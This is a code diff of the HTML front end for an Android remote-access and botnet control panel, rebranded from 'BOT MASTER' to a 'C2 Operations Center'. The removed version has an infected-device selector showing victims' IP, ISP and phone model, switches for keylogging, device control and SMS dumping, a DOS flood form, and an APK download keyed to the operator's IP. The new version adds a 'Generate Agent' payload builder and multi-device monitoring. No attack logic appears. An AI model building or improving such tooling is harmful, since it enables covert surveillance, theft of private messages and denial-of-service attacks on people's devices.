@@ -1,124 +1,88 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>C2 Operations Center</title>
 
-    <!-- FONTS -->
-
+    <!-- Fonts: Inter (UI) & JetBrains Mono (Code) & Material Icons -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Material+Icons&display=swap"
+        rel="stylesheet">
 
     <!-- CSS -->
     <link rel="stylesheet" href="../css/index.css">
-    <link rel="stylesheet" href="../css/nice-select.css">
-
 
     <!-- JS -->
     <script src="../js/socketIo.js" defer></script>
     <script src="../js/jquery.js" defer></script>
-    <script src="../js/partical.js" defer></script>
     <script src="../js/jquery.nice-select.min.js" defer></script>
     <script src="../js/index.js" defer></script>
-
 </head>
+
 <body>
-    <div id="mainBody">
-        <canvas id="bgParticals"></canvas>
-        <header>
-            <img src="../img/cyber-eye.png" alt="">
-            <p>BOT MASTER</p>
-        </header>
-        <div id="container">
-            <form id="left">
-                <div id="leftBG"></div>
-                <div id="options">
-                    <div style="padding: 1rem 1rem 0 1rem;background-color: #ffffff;border-radius: 5px 5px 0 0;">
-                        <select name="infected" id="infected" class="wide" onchange="getInfo(this.value)">
-                            <option data-display="Infected">None</option>
-                        </select>
-                    </div>
-                    <div id="infos">
-                        <div class="info">
-                            <span>Country :</span>
-                            <span>--</span>
-                        </div>
-                        <div class="info">
-                            <span>ISP :</span>
-                            <span>--</span>
-                        </div>
-                        <div class="info">
-                            <span>IP :</span>
-                            <span>--</span>
-                        </div>
-                        <div class="info">
-                            <span>Brand :</span>
-                            <span>--</span>
-                        </div>
-                        <div class="info">
-                            <span>Model :</span>
-                            <span>--</span>
-                        </div>
-                        <div class="info">
-                            <span>Manufacture :</span>
-                            <span>--</span>
-                        </div>
-                    </div>
-                    <div id="attackFuns">
-                        <ul>
-                            <li class="attackList1">
-                                <div>
-                                    <label class="switch">
-                                        <input type="checkbox" value="logger" name="attack">
-                                        <span class="slider round"></span>
-                                    </label>
-                                    <label for="">Logger</label>
-                                </div>
-                                <div>
-                                    <label class="switch">
-                                        <input type="checkbox" value="screen" name="attack">
-                                        <span class="slider round"></span>
-                                    </label>
-                                    <label for="">Device Control</label>
-                                </div>
-                                <div>
-                                    <label class="switch">
-                                        <input type="checkbox" value="sms" name="attack">
-                                        <span class="slider round"></span>
-                                    </label>
-                                    <label for="">Dump SMS</label>
-                                </div>
-                            </li>
-                            <li class="attackList2 hidden">
-                                <input type="text" id="pingIp" placeholder="IP"/>
-                                <input type="text" id="pingPort" placeholder="Port"/>
-                                <input type="text" id="pingWait" placeholder="Waiting Time"/>
-                                <div>
-                                    <button id="pingStart" onclick="DOS(true)">Start</button>
-                                    <button id="pingStop" onclick="DOS(false)" disabled >Stop</button>
-                                </div>
-                            </li>
-                        </ul>
+    <div id="app-layout">
+        <!-- Sidebar -->
+        <aside id="sidebar">
+            <div class="brand-header">
+                <img src="../img/cyber-eye.png" alt="Logo" class="logo">
+                <h1>RedTeam<span class="highlight">Ops</span></h1>
+            </div>
+
+            <nav class="main-nav">
+                <div class="nav-item active"><i class="material-icons">grid_view</i>Dashboard</div>
+            </nav>
+
+            <div class="server-status">
+                <span class="status-dot"></span>
+                <span>Server Online</span>
+            </div>
+        </aside>
+
+        <!-- Main Content -->
+        <main id="main-content">
+            <!-- Top Bar -->
+            <header id="topbar">
+                <div class="breadcrumbs">Operations / Dashboard</div>
+                <div class="controls">
+                    <div id="downloadAPK" class="download-widget">
+                        <input type="text" placeholder="C2 IP Address" value="">
+                        <button onclick="download()" title="Generate Payload">
+                            Generate Agent
+                        </button>
                     </div>
                 </div>
-                <div id="downloadAPK">
-                    <input type="text" placeholder="Your IP Address" value="">
-                    <img src="../img/download.svg" onclick="download()" title="Download APK" alt="">
+            </header>
+
+            <!-- Device Selector Panel -->
+            <div class="device-selector-panel">
+                <div class="selector-header">
+                    <h3><i class="material-icons">devices</i> Connected Devices</h3>
+                    <span id="deviceCount" class="device-count">0 active</span>
                 </div>
-            </form>
-            <div id="right">
-                <div id="rightBG"></div>
-                <textarea name="output" spellcheck="false" id="output" disabled></textarea>
-                <div id="imgSrc">
-                    <img draggable="false"  id="img" src="../img/phone.png" alt="">  
-                    <div id="cursor">
-                        <div></div>
-                    </div>
+                <div id="deviceList" class="device-list">
+                    <!-- Populated by JS -->
+                    <div class="empty-state">No devices connected</div>
                 </div>
             </div>
-        </div>
+
+            <!-- Multi-Device Grid -->
+            <div id="multiDeviceGrid" class="multi-device-grid">
+                <!-- Device panels dynamically created here -->
+                <div class="empty-grid-state">
+                    <i class="material-icons">pan_tool</i>
+                    <p>Select devices above to begin monitoring</p>
+                </div>
+            </div>
+
+        </main>
     </div>
-    <div id="msgs">
-    </div>
+
+    <!-- Notification Container -->
+    <div id="msgs"></div>
 </body>
+
 </html>
